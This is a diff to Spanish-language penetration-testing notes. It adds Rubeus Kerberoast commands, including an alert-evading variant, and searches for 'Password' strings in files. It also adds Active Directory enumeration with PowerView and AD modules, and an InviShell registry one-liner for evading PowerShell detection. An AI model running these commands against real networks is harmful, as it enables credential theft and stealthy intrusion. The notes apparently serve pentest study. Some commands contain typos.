@@ -1,3 +1,4 @@
+
 Herramientas generales:
     -Burpsuite:
         -Proxy: Herramienta necesaria para interceptar peticiones HTTP/HTTPS.
@@ -17,7 +18,14 @@ Herramientas generales:
             -Desplegar un servidor smb: impacket-smbserver remoteShare localShare
             -Desplegar un relay smb: impacket-smbrelayx
         -Responder: Herramienta utilizada para el envenenamiento de peticiones para multiples protocolos, entre ellos HTTP,DNS,SMB,FTP.
+     -Rubeus: Herramienta que permite realizar ataques de Kerberoast.
+            Ejemplo #01 identificar y validar usuarios: Rubeus.exe kerberoast /stats
+            Ejemplo #02 generar ataque contra la cuenta "accountservice": Rubeus.exe kerberoast /user:accountservice                    /simple /outfile: Path/to/hashoutput
+            Ejemplo #03 generar ataque evitando alertas de downgrade de protocolos: Rubeus.exe kerberoast                               /user:accountservice /rc4opsec /outfile: Path/to/hashoutput
 
+Utiles:
+    Busqueda por cadenas de texto en CMD: type ARCHIVO.txt | findstr "Password"
+    Busqueda por cadenas de texto en Powershell: type ARCHIVO.txt | Select-String -Pattern "Password" 
 
 Pentest de aplicaciones WEB.
     -Fuzzing: Técnica utilizada para enumerar directorios o ficheros existentes en el sitio web.
@@ -87,6 +95,10 @@ Pentest sobre windows.
             wmic service list brief | findstr "Running"
         -Enumerar tareas programadas:
             schtasks
+        -Enumeración local: 
+            -Enumerar todos los datos del usuario actual: whoami /all
+            -Enumerar todos los grupos del usuaro actual: whoami /group
+            -Enumerar privilegios heredados del usuario actual: whoami /priv
     -Identificación de exploits
     -Troubleshooting
     -Escalación de privilegios
@@ -120,13 +132,22 @@ Pentest sobre Active Directory.
             Ejemplo #5 enumerar confianza entre dominos: Get-DomainTrust | Get-ADTrust -Filter *
             Ejemplo #6 enumerar usuarios de un forest: Get-ADUser -Filter * -Server NOMBREDELFOREST
             Ejemplo #7 enumerar equipos donde el usuario es administrador local: Find-LocalAdminAccess -Verbose | Find-WMILocalAdminAccess.ps1 | Find-PSRemotingLocalAdminAccess.ps1
+            Ejemplo #8 enumerar grupos a los que pertenece un grupo/usuario: Get-DomainGroup -UserName USUARIO
+            Ejemplo #9 enumerar ACLs de un grupo sobre otro grupo: Get-DomainObjectAcl -Identity GRUPOFINAL -ResolveGUIDs | ForEach-Object {$_ |Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match 'GRUPOINICIAL'}
+            Ejemplo #10 enumerar cuentas de servicio: Get-AdUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
         -InviShell: InviShell es una herramienta que permite esconder otras herramientas basadas en powershell, permite evadir restricciónes de ejecución y detección.
-            Ejemplo no privilegiado: ./RunWithRegistryNonAdmin.bat -> . ./PowerView.ps1
-            Ejemplo privilegiado: ./RunWithPathAsAdmin.bat -> . ./PowerView.ps1
+            Ejemplo no privilegiado (one liner desde CMD): 
+                a) RunWithRegistryNonAdmin.bat;et COR_ENABLE_PROFILING=1;set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db} /f; reg add "HKCU\Software/Casses\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f; REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\AD\Tools\InviShell\InviShellProf.dll" /f; powershell
+         -ADModule: Modulos de Powershell que facilita la enumeración en entornos de Active Directory.
+            Uso: Import-Module C:\Path\To\Microsoft.ActiveDirectory.Management.dll; Import-Module C:\Path\To\ActiveDirectory.psd1
+            Ejemplo #1 enumerar Grupos a los que pertenece un usuario: Get-ADPrincipalGroupMembership -Identity USUARIO
+            Ejemplo #2 enumerar Grupos a los que pertenece un grupo: Get-ADPrincipalGroupMembership -Identity GRUPO
     -Descubrimiento de puertos
     -Información de versiones
-    -Enumeración
+    -Enumeración:
     -Ataques a Active Directory
+        -Kerberoast: Es un ataque orientado a la obtención de un TGS (Ticket Granting Service) de una cuenta, dicho ticket              es un hash que contempla la contraseña de la cuenta, la obtención de ticket es silenciosa y dicho ticket puede 
+             puede ser crackeado con herramientas como John o Hashcat.
     
 Ataque a contraseñas.
     -Crackeado con Jhon
